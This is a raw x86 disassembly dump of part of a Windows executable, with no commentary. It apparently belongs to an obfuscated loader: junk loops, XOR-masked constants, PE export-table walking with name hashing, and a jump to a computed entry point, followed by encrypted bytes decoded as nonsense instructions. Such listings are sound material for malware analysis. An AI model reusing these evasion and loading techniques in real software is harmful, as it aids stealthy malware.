  40894f:	jne    0x40895e
  408955:	push   DWORD PTR [ebp-0xc]
  408958:	call   DWORD PTR ds:0x442394
  40895e:	cmp    DWORD PTR ds:0x41073f,0x6
  408965:	jne    0x40897a
  40896b:	xor    edx,edx
  40896d:	or     edx,DWORD PTR ds:0x41073f
  408973:	inc    edx
  408974:	mov    DWORD PTR ds:0x41073f,edx
  40897a:	jmp    0x40892c
  40897f:	xor    DWORD PTR ds:0x4479a8,ebx
  408985:	mov    eax,DWORD PTR [eax+0x198]
  40898b:	mov    DWORD PTR [ebp-0x8],eax
  40898e:	or     DWORD PTR ds:0x4479a4,0xc15
  408998:	mov    eax,DWORD PTR [ebp-0x1c]
  40899b:	mov    edx,DWORD PTR [ebp-0x8]
  40899e:	xor    ebx,0x1805
  4089a4:	xor    eax,esi
  4089a6:	dec    ebx
  4089a7:	add    eax,edi
  4089a9:	sbb    ebx,DWORD PTR ds:0x41074f
  4089af:	mov    DWORD PTR [edx],eax
  4089b1:	add    ebx,DWORD PTR ds:0x44a6d4
  4089b7:	lea    eax,[ebp-0x10]
  4089ba:	dec    ebx
  4089bb:	mov    DWORD PTR [ebp-0x34],eax
  4089be:	and    DWORD PTR ds:0x410757,0x0
  4089c8:	jmp    0x4089db
  4089cd:	xor    eax,eax
  4089cf:	or     eax,DWORD PTR ds:0x410757
  4089d5:	inc    eax
  4089d6:	mov    ds:0x410757,eax
  4089db:	cmp    DWORD PTR ds:0x410757,0x13
  4089e2:	jae    0x408a35
  4089e8:	cmp    DWORD PTR ds:0x410757,0x6
  4089ef:	jne    0x408a0d
  4089f5:	push   0x1b4e
  4089fa:	push   0x76a9
  4089ff:	push   DWORD PTR [ebp-0x1c]
  408a02:	push   0x886b
  408a07:	call   DWORD PTR ds:0x442398
  408a0d:	cmp    DWORD PTR ds:0x410757,0x5
  408a14:	jne    0x408a25
  408a1a:	mov    eax,ds:0x410757
  408a1f:	inc    eax
  408a20:	mov    ds:0x410757,eax
  408a25:	jmp    0x4089cd
  408a2a:	mov    eax,ds:0x44a6dc
  408a2f:	and    DWORD PTR ds:0x424855,eax
  408a35:	mov    eax,DWORD PTR [ebp-0x1c]
  408a38:	adc    edx,0x330f
  408a3e:	mov    edx,DWORD PTR [ebp-0x34]
  408a41:	sub    DWORD PTR ds:0x41074b,ebx
  408a47:	xor    eax,esi
  408a49:	mov    DWORD PTR ds:0x447980,0x18
  408a53:	cmp    DWORD PTR ds:0x447980,0x0
  408a5a:	je     0x408b05
  408a60:	cmp    DWORD PTR ds:0x447980,0x2
  408a67:	jne    0x408a82
  408a6d:	push   DWORD PTR [ebp-0x28]
  408a70:	push   DWORD PTR [ebp-0x20]
  408a73:	push   DWORD PTR [ebp-0x10]
  408a76:	push   DWORD PTR [ebp-0x1c]
  408a79:	push   DWORD PTR [ebp-0x28]
  408a7c:	call   DWORD PTR ds:0x4420fc
  408a82:	cmp    DWORD PTR ds:0x447980,0x3
  408a89:	jne    0x408a9e
  408a8f:	xor    ebx,ebx
  408a91:	xor    ebx,DWORD PTR ds:0x447980
  408a97:	dec    ebx
  408a98:	mov    DWORD PTR ds:0x447980,ebx
  408a9e:	xor    ebx,ebx
  408aa0:	add    ebx,DWORD PTR ds:0x447980
  408aa6:	dec    ebx
  408aa7:	mov    DWORD PTR ds:0x447980,ebx
  408aad:	jmp    0x408a53
  408ab2:	and    DWORD PTR ds:0x424851,0x0
  408abc:	jmp    0x408ace
  408ac1:	mov    ebx,DWORD PTR ds:0x424851
  408ac7:	inc    ebx
  408ac8:	mov    DWORD PTR ds:0x424851,ebx
  408ace:	cmp    DWORD PTR ds:0x424851,0x10
  408ad5:	jae    0x408b05
  408adb:	cmp    DWORD PTR ds:0x424851,0x19
  408ae2:	jne    0x408af3
  408ae8:	push   0x82d5
  408aed:	call   DWORD PTR ds:0x442100
  408af3:	jmp    0x408ac1
  408af8:	movzx  ebx,WORD PTR ds:0x410757
  408aff:	and    DWORD PTR ds:0x4479a8,ebx
  408b05:	add    eax,edi
  408b07:	adc    DWORD PTR ds:0x42485d,0x6c9f
  408b11:	mov    DWORD PTR [edx],eax
  408b13:	mov    DWORD PTR [ebp-0x2c],ecx
  408b16:	lea    eax,[ebp-0x2c]
  408b19:	or     ebx,ebx
  408b1b:	mov    DWORD PTR [ebp-0x14],eax
  408b1e:	add    ebx,eax
  408b20:	mov    eax,DWORD PTR [ebp-0x2c]
  408b23:	sub    ebx,0x4e67
  408b29:	mov    ecx,DWORD PTR [ebp-0x14]
  408b2c:	xor    eax,esi
  408b2e:	adc    ebx,0x2698
  408b34:	add    eax,0x32729e
  408b39:	and    DWORD PTR ds:0x424865,0x0
  408b43:	mov    ebx,DWORD PTR ds:0x424865
  408b49:	inc    ebx
  408b4a:	mov    DWORD PTR ds:0x424865,ebx
  408b50:	cmp    DWORD PTR ds:0x424865,0xb
  408b57:	jne    0x408b68
  408b5d:	push   0x410870
  408b62:	call   DWORD PTR ds:0x442104
  408b68:	cmp    DWORD PTR ds:0x424865,0xa
  408b6f:	jne    0x408b82
  408b75:	mov    ebx,DWORD PTR ds:0x424865
  408b7b:	inc    ebx
  408b7c:	mov    DWORD PTR ds:0x424865,ebx
  408b82:	cmp    DWORD PTR ds:0x424865,0x19
  408b89:	jb     0x408b43
  408b8f:	adc    ebx,DWORD PTR ds:0x41074b
  408b95:	mov    DWORD PTR [ecx],eax
  408b97:	sub    DWORD PTR ds:0x44a6dc,0x6b19
  408ba1:	mov    eax,ds:0x444274
  408ba6:	sbb    ebx,0x4548
  408bac:	mov    DWORD PTR [ebp-0x24],0x8e12febe
  408bb3:	xor    DWORD PTR ds:0x447998,edx
  408bb9:	mov    eax,DWORD PTR [eax]
  408bbb:	xor    DWORD PTR ds:0x44a6d0,ebx
  408bc1:	mov    cx,WORD PTR [ebp-0x10]
  408bc5:	movzx  ecx,cx
  408bc8:	xor    ebx,DWORD PTR ds:0x410757
  408bce:	add    ecx,DWORD PTR [eax]
  408bd0:	mov    DWORD PTR [ebp-0x40],0xf89c8531
  408bd7:	mov    ebx,DWORD PTR ds:0x447994
  408bdd:	sub    DWORD PTR ds:0x44a6e0,ebx
  408be3:	mov    DWORD PTR [ebp-0x14],ecx
  408be6:	xor    ebx,ebx
  408be8:	mov    ebx,0x5a3fc9e
  408bed:	and    DWORD PTR ds:0x44798c,0x0
  408bf7:	mov    ecx,DWORD PTR ds:0x44798c
  408bfd:	inc    ecx
  408bfe:	mov    DWORD PTR ds:0x44798c,ecx
  408c04:	cmp    DWORD PTR ds:0x44798c,0x7
  408c0b:	jne    0x408c36
  408c11:	push   0x7083
  408c16:	push   0x1db3
  408c1b:	push   0x7eea
  408c20:	push   0x447984
  408c25:	push   DWORD PTR [ebp-0x14]
  408c28:	push   DWORD PTR [ebp-0x24]
  408c2b:	push   0x41089f
  408c30:	call   DWORD PTR ds:0x44239c
  408c36:	cmp    DWORD PTR ds:0x44798c,0x6
  408c3d:	jne    0x408c50
  408c43:	mov    ecx,DWORD PTR ds:0x44798c
  408c49:	inc    ecx
  408c4a:	mov    DWORD PTR ds:0x44798c,ecx
  408c50:	cmp    DWORD PTR ds:0x44798c,0x10
  408c57:	jb     0x408bf7
  408c5d:	mov    eax,DWORD PTR [ebp-0x1c]
  408c60:	mov    ecx,DWORD PTR [ebp-0x8]
  408c63:	xor    eax,esi
  408c65:	add    eax,edi
  408c67:	mov    DWORD PTR ds:0x410757,0x128d
  408c71:	cmp    DWORD PTR [ecx],eax
  408c73:	mov    DWORD PTR ds:0x424861,0x2c74
  408c7d:	jne    0x408de6
  408c83:	movzx  eax,BYTE PTR ds:0x410747
  408c8a:	adc    eax,DWORD PTR ds:0x410753
  408c90:	mov    ds:0x410747,eax
  408c95:	mov    eax,DWORD PTR [ebp-0x1c]
  408c98:	mov    ecx,DWORD PTR [ebp-0x14]
  408c9b:	or     DWORD PTR ds:0x44d424,0x44d420
  408ca5:	xor    eax,esi
  408ca7:	or     DWORD PTR ds:0x447988,0x44d428
  408cb1:	add    eax,edi
  408cb3:	mov    DWORD PTR ds:0x44799c,0x2417
  408cbd:	cmp    DWORD PTR [ecx],eax
  408cbf:	jne    0x408d21
  408cc5:	dec    edx
  408cc6:	mov    eax,DWORD PTR [ebp-0x1c]
  408cc9:	sbb    DWORD PTR ds:0x44d424,0x7bb6
  408cd3:	mov    ecx,DWORD PTR [ebp-0x34]
  408cd6:	adc    DWORD PTR ds:0x447990,ecx
  408cdc:	xor    eax,esi
  408cde:	xor    DWORD PTR ds:0x44d420,0x6611
  408ce8:	add    eax,edi
  408cea:	movzx  edx,WORD PTR ds:0x42484d
  408cf1:	sbb    DWORD PTR ds:0x424855,edx
  408cf7:	mov    DWORD PTR [ecx],eax
  408cf9:	dec    ecx
  408cfa:	mov    eax,DWORD PTR [ebp-0x34]
  408cfd:	mov    ecx,DWORD PTR [ebp-0x40]
  408d00:	sbb    edx,DWORD PTR ds:0x44d420
  408d06:	xor    ecx,esi
  408d08:	adc    edx,DWORD PTR ds:0x4479a8
  408d0e:	mov    edx,0xffcd8d62
  408d13:	sbb    DWORD PTR ds:0x447984,0x447980
  408d1d:	sub    edx,ecx
  408d1f:	add    DWORD PTR [eax],edx
  408d21:	mov    DWORD PTR ds:0x410747,0x19
  408d2b:	cmp    DWORD PTR ds:0x410747,0x0
  408d32:	je     0x408d8e
  408d38:	cmp    DWORD PTR ds:0x410747,0x5
  408d3f:	jne    0x408d63
  408d45:	push   DWORD PTR [ebp-0x1c]
  408d48:	push   0x2684
  408d4d:	push   DWORD PTR [ebp-0x18]
  408d50:	push   DWORD PTR [ebp-0x28]
  408d53:	push   0x71f6
  408d58:	push   0x2f24
  408d5d:	call   DWORD PTR ds:0x4423a0
  408d63:	cmp    DWORD PTR ds:0x410747,0x6
  408d6a:	jne    0x408d7b
  408d70:	mov    eax,ds:0x410747
  408d75:	dec    eax
  408d76:	mov    ds:0x410747,eax
  408d7b:	xor    eax,eax
  408d7d:	or     eax,DWORD PTR ds:0x410747
  408d83:	dec    eax
  408d84:	mov    ds:0x410747,eax
  408d89:	jmp    0x408d2b
  408d8e:	mov    eax,ds:0x444274
  408d93:	mov    eax,DWORD PTR [eax]
  408d95:	mov    cx,WORD PTR [ebp-0x10]
  408d99:	movzx  ecx,cx
  408d9c:	add    ecx,DWORD PTR [eax]
  408d9e:	mov    DWORD PTR [ebp-0x14],ecx
  408da1:	mov    eax,DWORD PTR [ebp-0x28]
  408da4:	mov    ecx,DWORD PTR [ebp-0x28]
  408da7:	xor    eax,esi
  408da9:	lea    eax,[eax+eax*1+0x32729e]
  408db0:	xor    ecx,esi
  408db2:	sub    ecx,eax
  408db4:	mov    ax,WORD PTR [ebp-0x10]
  408db8:	movzx  eax,ax
  408dbb:	cmp    eax,ecx
  408dbd:	mov    eax,DWORD PTR [ebp-0x40]
  408dc0:	movzx  ecx,WORD PTR [ebp-0x10]
  408dc4:	jg     0x408dd9
  408dca:	xor    eax,esi
  408dcc:	sub    ecx,eax
  408dce:	sub    ecx,edi
  408dd0:	mov    WORD PTR [ebp-0x10],cx
  408dd4:	jmp    0x408de6
  408dd9:	xor    eax,esi
  408ddb:	lea    eax,[eax+ecx*1+0x32729e]
  408de2:	mov    WORD PTR [ebp-0x10],ax
  408de6:	mov    ecx,DWORD PTR [ebp-0x24]
  408de9:	mov    eax,0x8e12febe
  408dee:	cmp    ecx,eax
  408df0:	je     0x408e04
  408df6:	mov    eax,DWORD PTR [ebp-0x8]
  408df9:	mov    DWORD PTR [eax],0x60341e8d
  408dff:	jmp    0x40902a
  408e04:	mov    ecx,DWORD PTR [ebp-0x24]
  408e07:	cmp    ecx,0x5142ddbc
  408e0d:	jne    0x408e85
  408e13:	mov    eax,DWORD PTR [ebp-0x8]
  408e16:	mov    DWORD PTR [eax],0x4214febc
  408e1c:	mov    eax,DWORD PTR [ebp-0x8]
  408e1f:	mov    DWORD PTR [ebp-0xc],eax
  408e22:	mov    eax,DWORD PTR [ebp-0x28]
  408e25:	mov    eax,DWORD PTR [ebp-0x1c]
  408e28:	mov    DWORD PTR [ebp-0x3c],ebx
  408e2b:	mov    eax,DWORD PTR [ebp-0x3c]
  408e2e:	mov    DWORD PTR [ebp-0x4],0x4eb5
  408e35:	cmp    eax,ebx
  408e37:	jne    0x40902a
  408e3d:	mov    ax,WORD PTR [ebp-0x4]
  408e41:	mov    ecx,0x8a42
  408e46:	xor    ax,cx
  408e49:	mov    ecx,0x3b08
  408e4e:	add    ax,cx
  408e51:	mov    ecx,DWORD PTR [ebp-0xc]
  408e54:	movzx  eax,ax
  408e57:	not    eax
  408e59:	and    eax,DWORD PTR [ecx]
  408e5b:	mov    ecx,DWORD PTR [ebp-0xc]
  408e5e:	mov    DWORD PTR [ecx],eax
  408e60:	jmp    0x408e6c
  408e65:	xor    DWORD PTR [ebp-0x3c],0xe149ebe
  408e6c:	mov    ax,WORD PTR [ebp-0x4]
  408e70:	push   DWORD PTR [ebp-0xc]
  408e73:	call   0x407112
  408e78:	test   eax,eax
  408e7a:	je     0x408e65
  408e80:	jmp    0x40902a
  408e85:	mov    ecx,DWORD PTR [ebp-0x24]
  408e88:	cmp    ecx,0x1443fcbd
  408e8e:	jne    0x408ea2
  408e94:	mov    eax,DWORD PTR [ebp-0x8]
  408e97:	mov    DWORD PTR [eax],0x60062d8f
  408e9d:	jmp    0x40902a
  408ea2:	mov    ecx,DWORD PTR [ebp-0x24]
  408ea5:	cmp    ecx,eax
  408ea7:	jne    0x408faf
  408ead:	mov    eax,DWORD PTR [ebp-0x1c]
  408eb0:	mov    ecx,DWORD PTR [ebp-0x8]
  408eb3:	xor    eax,esi
  408eb5:	add    eax,edi
  408eb7:	cmp    DWORD PTR [ecx],eax
  408eb9:	je     0x408f3c
  408ebf:	mov    ecx,DWORD PTR [ebp-0x2c]
  408ec2:	mov    eax,DWORD PTR [ebp-0x8]
  408ec5:	mov    eax,DWORD PTR [eax]
  408ec7:	mov    eax,DWORD PTR [eax+0x3c]
  408eca:	lea    ecx,[ecx*8+0x78]
  408ed1:	add    eax,ecx
  408ed3:	mov    ecx,DWORD PTR [ebp-0x8]
  408ed6:	mov    ecx,DWORD PTR [ecx]
  408ed8:	mov    eax,DWORD PTR [eax+ecx*1]
  408edb:	mov    DWORD PTR [ebp-0x4],eax
  408ede:	mov    eax,DWORD PTR [ebp-0x1c]
  408ee1:	xor    eax,esi
  408ee3:	add    eax,edi
  408ee5:	mov    DWORD PTR [ebp-0xc],eax
  408ee8:	mov    eax,DWORD PTR [ebp-0x1c]
  408eeb:	mov    ecx,DWORD PTR [ebp-0x4]
  408eee:	xor    eax,esi
  408ef0:	add    eax,edi
  408ef2:	cmp    ecx,eax
  408ef4:	je     0x40902a
  408efa:	mov    eax,DWORD PTR [ebp-0x8]
  408efd:	mov    ecx,DWORD PTR [ebp-0x4]
  408f00:	add    ecx,DWORD PTR [eax]
  408f02:	mov    DWORD PTR [ebp-0xc],ecx
  408f05:	mov    eax,DWORD PTR [ebp-0xc]
  408f08:	mov    ecx,DWORD PTR [ebp-0x8]
  408f0b:	mov    eax,DWORD PTR [eax+0xc]
  408f0e:	mov    ecx,DWORD PTR [ecx]
  408f10:	mov    al,BYTE PTR [eax+ecx*1]
  408f13:	add    al,0x35
  408f15:	xor    al,0x49
  408f17:	cmp    al,0xc9
  408f19:	je     0x408f30
  408f1f:	mov    eax,DWORD PTR [ebp-0x1c]
  408f22:	mov    ecx,DWORD PTR [ebp-0x8]
  408f25:	xor    eax,esi
  408f27:	add    eax,edi
  408f29:	mov    DWORD PTR [ecx],eax
  408f2b:	jmp    0x40902a
  408f30:	xor    DWORD PTR [ebp-0x24],0x5fd8f
  408f37:	jmp    0x40902a
  408f3c:	mov    eax,DWORD PTR [ebp-0x8]
  408f3f:	mov    ecx,DWORD PTR [ebp-0x14]
  408f42:	mov    ecx,DWORD PTR [ecx]
  408f44:	mov    DWORD PTR [eax],ecx
  408f46:	mov    eax,DWORD PTR [ebp-0x8]
  408f49:	mov    DWORD PTR [ebp-0xc],eax
  408f4c:	mov    eax,DWORD PTR [ebp-0x28]
  408f4f:	mov    eax,DWORD PTR [ebp-0x1c]
  408f52:	mov    DWORD PTR [ebp-0x44],ebx
  408f55:	mov    eax,DWORD PTR [ebp-0x44]
  408f58:	mov    DWORD PTR [ebp-0x4],0x4eb5
  408f5f:	cmp    eax,ebx
  408f61:	jne    0x40902a
  408f67:	mov    ax,WORD PTR [ebp-0x4]
  408f6b:	mov    ecx,0x8a42
  408f70:	xor    ax,cx
  408f73:	mov    ecx,0x3b08
  408f78:	add    ax,cx
  408f7b:	mov    ecx,DWORD PTR [ebp-0xc]
  408f7e:	movzx  eax,ax
  408f81:	not    eax
  408f83:	and    eax,DWORD PTR [ecx]
  408f85:	mov    ecx,DWORD PTR [ebp-0xc]
  408f88:	mov    DWORD PTR [ecx],eax
  408f8a:	jmp    0x408f96
  408f8f:	xor    DWORD PTR [ebp-0x44],0xe149ebe
  408f96:	mov    ax,WORD PTR [ebp-0x4]
  408f9a:	push   DWORD PTR [ebp-0xc]
  408f9d:	call   0x407112
  408fa2:	test   eax,eax
  408fa4:	je     0x408f8f
  408faa:	jmp    0x40902a
  408faf:	mov    eax,DWORD PTR [ebp-0x24]
  408fb2:	cmp    eax,0x33450cad
  408fb7:	jne    0x40902a
  408fbd:	mov    eax,DWORD PTR [ebp-0x8]
  408fc0:	mov    DWORD PTR [eax],0x443dc9d
  408fc6:	mov    eax,DWORD PTR [ebp-0x8]
  408fc9:	mov    DWORD PTR [ebp-0xc],eax
  408fcc:	mov    eax,DWORD PTR [ebp-0x28]
  408fcf:	mov    eax,DWORD PTR [ebp-0x1c]
  408fd2:	mov    DWORD PTR [ebp-0x38],ebx
  408fd5:	mov    eax,DWORD PTR [ebp-0x38]
  408fd8:	mov    DWORD PTR [ebp-0x4],0x4eb5
  408fdf:	cmp    eax,ebx
  408fe1:	jne    0x40902a
  408fe7:	mov    ax,WORD PTR [ebp-0x4]
  408feb:	mov    ecx,0x8a42
  408ff0:	xor    ax,cx
  408ff3:	mov    ecx,0x3b08
  408ff8:	add    ax,cx
  408ffb:	mov    ecx,DWORD PTR [ebp-0xc]
  408ffe:	movzx  eax,ax
  409001:	not    eax
  409003:	and    eax,DWORD PTR [ecx]
  409005:	mov    ecx,DWORD PTR [ebp-0xc]
  409008:	mov    DWORD PTR [ecx],eax
  40900a:	jmp    0x409016
  40900f:	xor    DWORD PTR [ebp-0x38],0xe149ebe
  409016:	mov    ax,WORD PTR [ebp-0x4]
  40901a:	push   DWORD PTR [ebp-0xc]
  40901d:	call   0x407112
  409022:	test   eax,eax
  409024:	je     0x40900f
  40902a:	mov    eax,DWORD PTR [ebp-0x24]
  40902d:	cmp    eax,0x8e12febe
  409032:	je     0x408bed
  409038:	mov    eax,DWORD PTR [ebp-0x8]
  40903b:	mov    eax,ds:0x4441a0
  409040:	mov    eax,DWORD PTR [eax+0x18c]
  409046:	mov    eax,DWORD PTR [eax]
  409048:	mov    DWORD PTR [ebp-0x58],eax
  40904b:	mov    eax,0xf89c8531
  409050:	mov    DWORD PTR [ebp-0x14],eax
  409053:	mov    DWORD PTR [ebp-0x14],eax
  409056:	mov    DWORD PTR [ebp-0x14],eax
  409059:	mov    DWORD PTR [ebp-0x14],0xf89c8535
  409060:	mov    DWORD PTR [ebp-0x4],eax
  409063:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  40906a:	mov    ebx,DWORD PTR [ebp-0x20]
  40906d:	xor    ebx,esi
  40906f:	add    ebx,edi
  409071:	jmp    0x4090ac
  409076:	mov    eax,DWORD PTR [ebp-0x18]
  409079:	xor    eax,esi
  40907b:	lea    eax,[eax+ebx*1+0x32729e]
  409082:	push   eax
  409083:	mov    eax,DWORD PTR [ebp-0x14]
  409086:	xor    eax,esi
  409088:	lea    eax,[ebp+eax*1+0x3272a6]
  40908f:	push   eax
  409090:	mov    eax,ds:0x4441a0
  409095:	push   DWORD PTR [eax+0x1bc]
  40909b:	call   0x402c35
  4090a0:	mov    eax,DWORD PTR [ebp-0x18]
  4090a3:	xor    eax,esi
  4090a5:	lea    ebx,[ebx+eax*1+0x32729e]
  4090ac:	mov    eax,DWORD PTR [ebp-0x18]
  4090af:	mov    ecx,DWORD PTR [ebp-0x18]
  4090b2:	xor    ecx,esi
  4090b4:	xor    eax,esi
  4090b6:	add    eax,ecx
  4090b8:	mov    ecx,DWORD PTR [ebp-0x18]
  4090bb:	xor    ecx,esi
  4090bd:	lea    eax,[eax+ecx*1+0x9757da]
  4090c4:	cmp    ebx,eax
  4090c6:	jbe    0x409076
  4090cc:	mov    eax,DWORD PTR [ebp+0xc]
  4090cf:	mov    ds:0x444024,eax
  4090d4:	mov    eax,DWORD PTR [ebp+0x10]
  4090d7:	mov    ds:0x444278,eax
  4090dc:	mov    eax,ds:0x444024
  4090e1:	mov    ecx,DWORD PTR [ebp-0x30]
  4090e4:	sub    eax,edi
  4090e6:	xor    eax,esi
  4090e8:	mov    DWORD PTR [ecx],eax
  4090ea:	mov    eax,DWORD PTR [ebp-0x4c]
  4090ed:	cmp    eax,0xf89c8534
  4090f2:	je     0x40914f
  4090f8:	mov    eax,DWORD PTR [ebp-0x20]
  4090fb:	mov    ecx,DWORD PTR [ebp-0x54]
  4090fe:	xor    eax,esi
  409100:	add    eax,edi
  409102:	cmp    eax,ecx
  409104:	je     0x40914f
  40910a:	mov    eax,ds:0x4441a0
  40910f:	mov    eax,DWORD PTR [eax+0x194]
  409115:	mov    ecx,DWORD PTR [eax]
  409117:	mov    eax,DWORD PTR [ecx+0x3c]
  40911a:	push   DWORD PTR ds:0x444278
  409120:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  409124:	push   DWORD PTR ds:0x444024
  40912a:	add    eax,ecx
  40912c:	mov    ecx,DWORD PTR ds:0x4441a0
  409132:	mov    ecx,DWORD PTR [ecx+0x194]
  409138:	push   DWORD PTR [ecx]
  40913a:	call   eax
  40913c:	mov    ecx,DWORD PTR ds:0x4441a0
  409142:	mov    ecx,DWORD PTR [ecx+0x1cc]
  409148:	mov    DWORD PTR [ecx],eax
  40914a:	jmp    0x409276
  40914f:	mov    eax,DWORD PTR [ebp-0x20]
  409152:	mov    ecx,DWORD PTR [ebp-0x58]
  409155:	xor    eax,esi
  409157:	add    eax,edi
  409159:	cmp    eax,ecx
  40915b:	jne    0x409259
  409161:	mov    eax,DWORD PTR [ebp-0x20]
  409164:	xor    eax,esi
  409166:	add    eax,edi
  409168:	mov    ds:0x444224,eax
  40916d:	mov    eax,DWORD PTR [ebp-0x20]
  409170:	xor    eax,esi
  409172:	add    eax,edi
  409174:	mov    ds:0x44421c,eax
  409179:	mov    eax,DWORD PTR [ebp-0x18]
  40917c:	mov    DWORD PTR [ebp-0x14],eax
  40917f:	mov    eax,DWORD PTR [ebp-0x20]
  409182:	mov    DWORD PTR [ebp+0xc],eax
  409185:	mov    eax,DWORD PTR [ebp+0xc]
  409188:	xor    eax,esi
  40918a:	add    eax,edi
  40918c:	mov    DWORD PTR [ebp+0xc],eax
  40918f:	mov    eax,ds:0x444020
  409194:	mov    eax,DWORD PTR [eax]
  409196:	mov    DWORD PTR [ebp+0xc],eax
  409199:	mov    eax,ds:0x444228
  40919e:	mov    eax,DWORD PTR [eax]
  4091a0:	mov    DWORD PTR [ebp-0x30],eax
  4091a3:	mov    DWORD PTR [ebp+0x10],0xf89c8735
  4091aa:	mov    eax,DWORD PTR [ebp+0x10]
  4091ad:	xor    eax,esi
  4091af:	add    eax,edi
  4091b1:	mov    DWORD PTR [ebp+0x10],eax
  4091b4:	mov    eax,ds:0x4441a0
  4091b9:	mov    DWORD PTR [ebp+0x10],eax
  4091bc:	mov    eax,DWORD PTR [ebp+0xc]
  4091bf:	mov    DWORD PTR [ebp+0xc],eax
  4091c2:	mov    eax,DWORD PTR [ebp+0xc]
  4091c5:	push   0x4
  4091c7:	pop    ecx
  4091c8:	sub    ecx,eax
  4091ca:	add    ecx,DWORD PTR [ebp-0x30]
  4091cd:	mov    DWORD PTR [ebp-0x4],0xf89c85f5
  4091d4:	mov    DWORD PTR [ebp+0x10],ecx
  4091d7:	mov    DWORD PTR [ebp-0xa0],0xf89c8531
  4091e1:	mov    eax,DWORD PTR [ebp+0xc]
  4091e4:	mov    DWORD PTR [ebp-0x9c],eax
  4091ea:	mov    eax,DWORD PTR [ebp+0x10]
  4091ed:	mov    DWORD PTR [ebp-0x98],eax
  4091f3:	mov    eax,DWORD PTR [ebp-0x4]
  4091f6:	xor    eax,esi
  4091f8:	add    eax,edi
  4091fa:	mov    DWORD PTR [ebp-0x94],eax
  409200:	lea    eax,[ebp-0x5c]
  409203:	mov    DWORD PTR [ebp-0x90],eax
  409209:	mov    eax,DWORD PTR [ebp-0xa0]
  40920f:	xor    eax,esi
  409211:	add    eax,edi
  409213:	mov    DWORD PTR [ebp-0xa0],eax
  409219:	lea    eax,[ebp-0xa0]
  40921f:	push   eax
  409220:	mov    eax,DWORD PTR [ebp-0x14]
  409223:	xor    eax,esi
  409225:	add    eax,edi
  409227:	push   eax
  409228:	mov    eax,ds:0x4441c0
  40922d:	push   0x444116
  409232:	push   DWORD PTR [eax]
  409234:	call   0x40101c
  409239:	xor    esi,esi
  40923b:	mov    eax,DWORD PTR [ebp+0x10]
  40923e:	sub    eax,esi
  409240:	push   eax
  409241:	mov    eax,DWORD PTR [ebp+0xc]
  409244:	add    eax,esi
  409246:	push   eax
  409247:	call   0x40354e
  40924c:	inc    esi
  40924d:	cmp    esi,0x52
  409250:	jb     0x40923b
  409256:	mov    eax,DWORD PTR [ebp-0x14]
  409259:	call   0x405b6e
  40925e:	lea    eax,[ebp+0x4]
  409261:	mov    DWORD PTR [ebp-0x50],eax
  409264:	mov    eax,DWORD PTR [ebp-0x48]
  409267:	mov    eax,DWORD PTR [ebp-0x18]
  40926a:	push   DWORD PTR [ebp-0x20]
  40926d:	lea    eax,[ebp-0x50]
  409270:	push   eax
  409271:	call   0x40324f
  409276:	mov    eax,ds:0x4441a0
  40927b:	push   0x4
  40927d:	add    eax,0x1cc
  409282:	push   eax
  409283:	lea    eax,[ebp-0x48]
  409286:	push   eax
  409287:	call   0x402c35
  40928c:	mov    eax,DWORD PTR [ebp-0x48]
  40928f:	mov    eax,DWORD PTR [eax]
  409291:	pop    edi
  409292:	pop    ebx
  409293:	pop    esi
  409294:	leave  
  409295:	ret    0xc
  409298:	push   ebp
  409299:	mov    ebp,esp
  40929b:	sub    esp,0x58
  40929e:	add    eax,ecx
  4092a0:	mov    ecx,DWORD PTR [ebp+0x8]
  4092a3:	sub    eax,DWORD PTR ds:0x447988
  4092a9:	mov    eax,0x8a42
  4092ae:	add    DWORD PTR ds:0x410753,0x424855
  4092b8:	xor    ax,WORD PTR [ecx+0x20]
  4092bc:	and    DWORD PTR ds:0x447990,0x0
  4092c6:	mov    ecx,DWORD PTR ds:0x447990
  4092cc:	inc    ecx
  4092cd:	mov    DWORD PTR ds:0x447990,ecx
  4092d3:	cmp    DWORD PTR ds:0x447990,0x9
  4092da:	jne    0x4092f3
  4092e0:	push   DWORD PTR [ebp-0x28]
  4092e3:	push   0x44799c
  4092e8:	push   0x55d9
  4092ed:	call   DWORD PTR ds:0x4423a4
  4092f3:	cmp    DWORD PTR ds:0x447990,0x8
  4092fa:	jne    0x40930d
  409300:	mov    ecx,DWORD PTR ds:0x447990
  409306:	inc    ecx
  409307:	mov    DWORD PTR ds:0x447990,ecx
  40930d:	cmp    DWORD PTR ds:0x447990,0x14
  409314:	jb     0x4092c6
  40931a:	mov    ecx,0x3b08
  40931f:	add    ax,cx
  409322:	movzx  eax,ax
  409325:	sub    ecx,0x7afe
  40932b:	mov    DWORD PTR [ebp-0xc],eax
  40932e:	mov    BYTE PTR [ebp-0x1],0x7f
  409332:	lea    eax,[ebp-0x1]
  409335:	mov    DWORD PTR [ebp-0x10],eax
  409338:	and    ecx,0x503
  40933e:	jmp    0x409494
  409343:	mov    ?,ebx
  409345:	icebp  
  409346:	test   al,0x85
  409348:	stos   BYTE PTR es:[edi],al
  409349:	mov    ebp,0xef32abd
  40934e:	cmp    eax,0xfdc114da
  409353:	(bad)  
  409357:	daa    
  409358:	jg     0x4093d6
  40935a:	jl     0x409399
  40935c:	push   cs
  40935d:	scas   eax,DWORD PTR es:[edi]
  40935e:	loopne 0x409310
  409360:	sub    ah,0x3a
  409363:	shr    BYTE PTR [esi-0x67],1
  409366:	stos   DWORD PTR es:[edi],eax
  409367:	call   0x67c29157
  40936c:	adc    al,0x61
  40936e:	sub    esi,DWORD PTR [edi-0xcf27948]
  409374:	or     cl,dl
  409376:	pop    ebp
  409377:	stos   BYTE PTR es:[edi],al
  409378:	xchg   ebx,eax
  409379:	retf   0x743a
  40937c:	and    al,0xc0
  40937e:	dec    esp
  40937f:	mov    dl,0xb6
  409381:	push   es
  409382:	cld    
  409383:	inc    ecx
  409384:	pop    eax
  409385:	mov    dl,0x89
  409387:	mov    eax,ds:0xe6adb368
  40938c:	loop   0x4093dc
  40938e:	mov    dh,0x40
  409390:	cmp    eax,0x23a4511e
  409395:	push   esi
  409396:	push   esp
  409397:	imul   ebx,DWORD PTR [edi+ebp*2-0x2d7cd6e0],0xffffffcd
  40939f:	pop    ecx
  4093a0:	adc    DWORD PTR [ecx],eax
  4093a2:	cdq    
  4093a3:	iret   
  4093a4:	fwait
  4093a5:	sbb    esi,DWORD PTR [edi-0x75b23396]
  4093ab:	scas   al,BYTE PTR es:[edi]
  4093ac:	test   DWORD PTR [ebx],ebx
  4093ae:	pusha  
  4093af:	sub    eax,0xc2a73681
  4093b4:	xchg   ebx,eax
  4093b5:	jmp    0x4093dd
  4093b7:	fwait
